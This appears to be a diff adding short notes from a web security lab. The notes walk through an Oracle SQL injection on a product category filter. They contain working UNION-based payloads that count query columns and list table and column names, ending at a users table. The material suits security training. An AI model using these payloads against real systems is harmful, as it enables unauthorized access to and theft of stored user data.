@@ -1,0 +1,10 @@
+Frist cause error in the request via ('):
+GET /filter?category=Pets' HTTP/2 => server respond with internal server error
+Try '' => We get 200 ok then the server is sure has sqli vulnerability.
+The union payload: ' UNION SELECT NULL FROM all_tables---- 
+Gives us an error 
+Try to put another null column: ' UNION select null,null FROM all_tables--
+Gives us no error so the sql query is in 2 columns
+Dump all tables via: ' UNION select table_name,null FROM all_tables--
+We find : USERS_JMKEFG
+Dump table data: ' UNION select column_name,null FROM all_tab_columns WHERE table_name='USERS_JMKEFG'--
